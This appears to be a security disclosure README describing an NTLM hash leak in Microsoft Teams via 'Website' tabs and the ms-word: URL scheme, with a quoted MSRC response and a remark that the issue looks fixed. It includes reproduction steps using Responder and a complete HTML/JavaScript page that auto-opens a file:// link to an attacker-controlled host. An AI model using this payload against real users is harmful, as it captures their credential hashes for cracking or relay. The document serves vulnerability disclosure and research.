
# Description

When a user navigates to a "Website" tab  that directs to a specially designed webpage, it can result in the exposure of the NTLM hash through the activation of an Office URL scheme, thereby reducing the process to a single-click path for the leak.

If one attempts to open a link in the format `ms-word:ofv|u|file://Share/File.docx` from a browser, the following steps are required:

1- The user must confirm their intention to open Word.

2- The user must acknowledge and accept the risks as indicated by the warning message from MS Office.

However, on the Website tab, the user's action is simplified to only accepting the risk.



# Reproduction steps

 1. Run Responder on an "attacker" machine
 2. Serve an HTML page containing the code below:
   <!DOCTYPE html>
    <html>
    <head>
        <title>Auto Open Document</title>
    </head>
    <body>
        <a href="ms-word:ofv|u|file://ResponderIP_Or_MachineName/File.docx" id="autoOpenLink"></a>
        <script>
            window.onload = function() {
                document.getElementById('autoOpenLink').click();
            };
        </script>
    </body>
    </html>
 3. In Teams, set up a "Website" tab that directs to the webpage you have just set up.
 4. Access the "Tab."

When you visit the Tab, a JavaScript-triggered link automatically initiates the opening of Word. If the user agrees to the prompt in Word by clicking "Yes," their NTLM hash is transmitted to the "attacker's" machine.

# Demo
![PoC](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/TeamNTLM_V3.gif?raw=true)

# Discloser

> On Wed, Mar 27, 2024, 20:23 Microsoft Security Response Center <[secure@microsoft.com](mailto:secure@microsoft.com)<mailto:[secure@microsoft.com](mailto:secure@microsoft.com)>> wrote:  
Hello,  
Thank you for your submission. We determined your finding is valid but does not meet our bar for immediate servicing because the severity of the issue is low. Our engineers indicated that a user would still have to consent in Word or other Office clients before the NTLM is leaked, which reduces the severity. However, weve marked your finding for future review as an opportunity to improve our products, and as a feature issue to improve upon. I do not have a timeline for this review. As no further action is required at this time, I am closing this case.  
Regards,  
MSRC

Looks fixed in Microsoft Teams version **24033.813.2773.520.**
